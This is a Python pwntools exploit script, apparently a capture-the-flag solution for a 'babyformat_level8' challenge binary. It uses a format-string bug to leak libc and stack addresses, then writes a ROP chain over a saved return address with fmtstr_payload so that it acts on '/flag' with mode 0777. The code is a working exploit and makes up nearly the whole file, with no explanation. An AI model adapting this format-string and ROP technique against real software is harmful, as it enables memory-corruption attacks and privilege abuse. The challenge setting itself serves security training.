
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level8')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

def f():
    try:
        exploit1= b'%3$llx %152$llx aaaaaaaaaaaaaaaa%152$hhn'
        io.recvuntil(b'then exit.')
        io.sendline(exploit1)
        io.recvuntil(b"Your input is:")
        io.recvline()
        byte_leak = io.recvline(keepends=False)
        leak = byte_leak.decode().split(" ")

        libc = int(leak[0], 16)
        base = libc - 0x10e077
        rbp = leak[1]
        rbp_func = int(rbp, 16)
        func2_rbp = rbp_func - 16
        func2_rip = func2_rbp + 8
        rip_func =  func2_rip - 160  

        pop_rdi = base+0x23b6a 
        pop_rsi = base+0x2601f 
        mov_eax=base+0x10db64 
        exploit2 = b"B"*2 + fmtstr_payload(36, {
            rip_func : p64(pop_rdi),
            rip_func + 8 :rip_func+40  ,
            rip_func + 16 : p64(pop_rsi),
            rip_func + 24 : p64(0o777),
            rip_func + 32 : p64(mov_eax),
            rip_func + 40 : "/flag\x00"
            }, numbwritten=128,  write_size='short', strategy='fast')

        io.recvuntil(b'then exit.')
        io.sendline(exploit2)   
        io.interactive()
    except EOFError:
        print("EOFError")   

# f()

for i in range(20):
    f()
